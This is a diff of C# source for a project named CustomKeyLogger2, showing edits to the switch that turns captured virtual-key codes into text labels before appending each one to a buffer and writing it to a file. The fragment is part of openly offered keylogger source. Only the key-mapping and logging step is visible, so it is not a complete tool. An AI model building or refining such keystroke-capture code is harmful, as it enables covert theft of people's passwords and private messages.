@@ -131,41 +131,89 @@ namespace CustomKeyLogger2
 
             switch (vk)
             {
-                case hook.VK.VK_F1: temp = "<-F1->";
-                    break;
-                case hook.VK.VK_F2: temp = "<-F2->";
-                    break;
-                case hook.VK.VK_F3: temp = "<-F3->";
-                    break;
-                case hook.VK.VK_F4: temp = "<-F4->";
-                    break;
-                case hook.VK.VK_F5: temp = "<-F5->";
-                    break;
-                case hook.VK.VK_F6: temp = "<-F6->";
-                    break;
-                case hook.VK.VK_F7: temp = "<-F7->";
-                    break;
-                case hook.VK.VK_F8: temp = "<-F8->";
-                    break;
-                case hook.VK.VK_F9: temp = "<-F9->";
-                    break;
-                case hook.VK.VK_F10: temp = "<-F10->";
-                    break;
-                case hook.VK.VK_F11: temp = "<-F11->";
-                    break;
-                case hook.VK.VK_F12: temp = "<-F12->";
-                    break;
-                case hook.VK.VK_NUMLOCK: temp = "<-numlock->";
-                    break;
+                //case hook.VK.VK_F1: temp = "<-F1->";
+                //    break;
+                //case hook.VK.VK_F2: temp = "<-F2->";
+                //    break;
+                //case hook.VK.VK_F3: temp = "<-F3->";
+                //    break;
+                //case hook.VK.VK_F4: temp = "<-F4->";
+                //    break;
+                //case hook.VK.VK_F5: temp = "<-F5->";
+                //    break;
+                //case hook.VK.VK_F6: temp = "<-F6->";
+                //    break;
+                //case hook.VK.VK_F7: temp = "<-F7->";
+                //    break;
+                //case hook.VK.VK_F8: temp = "<-F8->";
+                //    break;
+                //case hook.VK.VK_F9: temp = "<-F9->";
+                //    break;
+                //case hook.VK.VK_F10: temp = "<-F10->";
+                //    break;
+                //case hook.VK.VK_F11: temp = "<-F11->";
+                //    break;
+                //case hook.VK.VK_F12: temp = "<-F12->";
+                //    break;
+
+                //case hook.VK.VK_SNAPSHOT: temp = "<-print screen->";
+                //    break;
                 //case hook.VK.VK_SCROLL: temp = "<-scroll>";
                 //    break;
-                case hook.VK.VK_LSHIFT: temp = "<-left shift->";
+                //case hook.VK.VK_PAUSE: temp = "<-pause->";
+                //    break;
+                case hook.VK.VK_INSERT: temp = "\r\n<-insert->";
                     break;
-                case hook.VK.VK_RSHIFT: temp = "<-right shift->";
+                case hook.VK.VK_HOME: temp = "\r\n<-home->";
                     break;
-                case hook.VK.VK_LCONTROL: temp = "<-left control->";
+                case hook.VK.VK_DELETE: temp = "\r\n<-delete->";
                     break;
-                case hook.VK.VK_RCONTROL: temp = "<-right control->";
+                //case hook.VK.VK_END: temp = "<-end->";
+                //    break;
+                //case hook.VK.VK_PRIOR: temp = "<-page up->";
+                //    break;
+                //case hook.VK.VK_NEXT: temp = "<-page down->";
+                //    break;
+                                
+                case hook.VK.VK_ESCAPE: temp = "\r\n<-esc->";
+                    break;
+                case hook.VK.VK_NUMLOCK: temp = "\r\n<-numlock->";
+                    break;
+                case hook.VK.VK_LSHIFT: temp = "\r\n<-left shift->";
+                    break;
+                case hook.VK.VK_RSHIFT: temp = "\r\n<-right shift->";
+                    break;
+                case hook.VK.VK_LCONTROL: temp = "\r\n<-left control->";
+                    break;
+                case hook.VK.VK_RCONTROL: temp = "\r\n<-right control->";
+                    break;
+                case hook.VK.VK_LMENU: temp = "\r\n<-left alt/menu->";
+                    break;
+                case hook.VK.VK_RMENU: temp = "\r\n<-right al/menu->";
+                    break;
+                case hook.VK.VK_TAB: temp = "\r\n<-tab->";
+                    break;
+                case hook.VK.VK_CAPITAL: temp = "\r\n<-caps lock->";
+                    break;
+                case hook.VK.VK_BACK: temp = "\r\n<-backspace->";
+                    break;
+                case hook.VK.VK_RETURN: temp = "\r\n<-enter->";
+                    break;
+                case hook.VK.VK_SPACE: temp = "\t";     //  "<-space->"
+                    break;
+
+                case hook.VK.VK_LEFT: temp = "\r\n<-arrow left->";
+                    break;
+                case hook.VK.VK_UP: temp = "\r\n<-arrow up->";
+                    break;
+                case hook.VK.VK_RIGHT: temp = "\r\n<-arrow right->";
+                    break;
+                case hook.VK.VK_DOWN: temp = "\r\n<-arrow down->";
+                    break;
+
+                case hook.VK.VK_MULTIPLY: temp = "*";
+                    break;
+                case hook.VK.VK_ADD: temp = "+";
                     break;
                 case hook.VK.VK_SEPERATOR: temp = "|";
                     break;
@@ -175,6 +223,22 @@ namespace CustomKeyLogger2
                     break;
                 case hook.VK.VK_DIVIDE: temp = "/";
                     break;
+
+                case hook.VK.VK_OEM_1: temp = ";";
+                    break;
+                case hook.VK.VK_OEM_PLUS: temp = "=";
+                    break;
+                case hook.VK.VK_OEM_COMMA: temp = ",";
+                    break;
+                case hook.VK.VK_OEM_MINUS: temp = "-";
+                    break;
+                case hook.VK.VK_OEM_PERIOD: temp = ".";
+                    break;
+                case hook.VK.VK_OEM_2: temp = "/";
+                    break;
+                case hook.VK.VK_OEM_3: temp = "`";
+                    break;
+
                 case hook.VK.VK_NUMPAD0: temp = "0";
                     break;
                 case hook.VK.VK_NUMPAD1: temp = "1";
@@ -195,6 +259,7 @@ namespace CustomKeyLogger2
                     break;
                 case hook.VK.VK_NUMPAD9: temp = "9";
                     break;
+
                 case hook.VK.VK_Q: temp = "q";
                     break;
                 case hook.VK.VK_W: temp = "w";
@@ -247,6 +312,7 @@ namespace CustomKeyLogger2
                     break;
                 case hook.VK.VK_M: temp = "m";
                     break;
+
                 case hook.VK.VK_0: temp = "0";
                     break;
                 case hook.VK.VK_1: temp = "1";
@@ -267,49 +333,15 @@ namespace CustomKeyLogger2
                     break;
                 case hook.VK.VK_9: temp = "9";
                     break;
-                //case hook.VK.VK_SNAPSHOT: temp = "<-print screen->";
-                //    break;
-                case hook.VK.VK_INSERT: temp = "<-insert->";
-                    break;
-                case hook.VK.VK_DELETE: temp = "<-delete->";
-                    break;
-                case hook.VK.VK_BACK: temp = "<-backspace->";
-                    break;
-                case hook.VK.VK_TAB: temp = "<-tab->";
-                    break;
-                case hook.VK.VK_RETURN: temp = "<-enter->";
-                    break;
-                //case hook.VK.VK_PAUSE: temp = "<-pause->";
-                //    break;
-                case hook.VK.VK_CAPITAL: temp = "<-caps lock->";
-                    break;
-                //case hook.VK.VK_ESCAPE: temp = "<-esc->";
-                //    break;
-                case hook.VK.VK_SPACE: temp = "<-space->";
-                    break;
-                //case hook.VK.VK_PRIOR: temp = "<-page up->";
-                //    break;
-                //case hook.VK.VK_NEXT: temp = "<-page down->";
-                //    break;
-                //case hook.VK.VK_END: temp = "<-end->";
-                //    break;
-                //case hook.VK.VK_HOME: temp = "<-home->";
-                //    break;
-                case hook.VK.VK_LEFT: temp = "<-arrow left->";
-                    break;
-                case hook.VK.VK_UP: temp = "<-arrow up->";
-                    break;
-                case hook.VK.VK_RIGHT: temp = "<-arrow right->";
-                    break;
-                case hook.VK.VK_DOWN: temp = "<-arrow down->";
-                    break;
                 default: break;
             }
 
             writeUp = writeUp + temp;
 
             unhide();
+#if Temp
             checkKeys();
+#endif
             writeToFile(temp);
         }
 
